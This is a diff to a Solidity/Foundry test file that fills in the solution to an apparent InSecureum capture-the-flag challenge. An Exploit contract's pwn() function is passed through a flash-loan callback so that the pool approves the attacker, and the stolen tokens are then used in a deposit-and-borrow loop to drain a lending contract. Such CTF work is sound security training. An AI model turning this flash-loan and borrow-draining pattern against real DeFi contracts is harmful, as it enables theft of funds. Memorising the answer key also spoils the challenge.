@@ -28,6 +28,8 @@ contract Challenge3Test is Test {
 
     address player = makeAddr("player");
 
+    Exploit exploit;
+
     function setUp() public {
 
         // create the tokens
@@ -58,17 +60,34 @@ contract Challenge3Test is Test {
         vm.label(address(token0), "InSecureumToken");
         vm.label(address(token1), "BoringToken");
 
+        exploit = new Exploit(token0); 
     }
 
-    function testChallenge() public {  
+    // Attack Path:
+    // 1. exploit the flashloan contract to get 10000 token0
+    // 2. deposit 10000 token0
+    // 3. borrow 10000 token0 2 times
+
+    function testChallenge() public {
 
         vm.startPrank(player);
 
-        /*//////////////////////////////
-        //    Add your hack below!    //
-        //////////////////////////////*/
+        flashLoanPool.flashLoan(
+            address(exploit),
+            abi.encodeWithSignature("pwn(address)", player)
+        );
+        token0.transferFrom(address(flashLoanPool), player, 10000 ether);
+        token0.approve(address(target), type(uint256).max);
 
-        //============================//
+        for(uint i; i<10; i++){
+            if (i == 9){
+                target.depositToken0(10000 ether);
+                break;
+            }
+            target.depositToken0(10000 ether);
+            target.borrowToken0(10000 ether);
+        }
+        target.borrowToken0(20000 ether);
 
         vm.stopPrank();
 
@@ -86,4 +105,12 @@ contract Exploit {
     IERC20 token1;
     BorrowSystemInsecureOracle borrowSystem;
     InsecureDexLP dex;
+
+    constructor(IERC20 _token0) {
+        token0 = _token0;
+    }
+
+    function pwn(address _user) public {
+        token0.approve(_user, 10000 ether);
+    }
 }
